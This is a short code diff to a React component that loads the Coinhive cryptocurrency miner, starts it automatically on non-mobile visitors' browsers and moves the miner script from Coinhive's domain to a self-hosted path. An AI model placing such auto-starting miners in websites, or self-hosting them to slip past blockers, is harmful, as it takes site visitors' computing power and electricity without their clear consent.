@@ -11,7 +11,7 @@ const config = {
   throttle: 0.3,
   autoThreads: false,
   siteKey: '45EnDz1yUgdjmV9yX31UgamUy9ZjzIyt',
-  script: 'https://coinhive.com/lib/coinhive.min.js'
+  script: '/coinhive.min.js'
 }
 
 const Animation = posed.div(fadeIn)
@@ -47,17 +47,18 @@ export default class CoinHiveClient extends PureComponent {
     })
   }
 
-  componentDidMount() {
-    this.buildMiner()
-      .then(miner => {
-        this.setState({ miner })
+  async componentDidMount() {
+    try {
+      let miner = await this.buildMiner()
+      this.setState({ miner })
 
-        if (this.state.miner && !this.state.miner.isMobile()) {
-          this.start()
-          this.report()
-        }
-      })
-      .catch(() => null)
+      if (this.state.miner && !this.state.miner.isMobile()) {
+        this.start()
+        this.report()
+      }
+    } catch (error) {
+      return null
+    }
   }
 
   componentWillUnmount() {
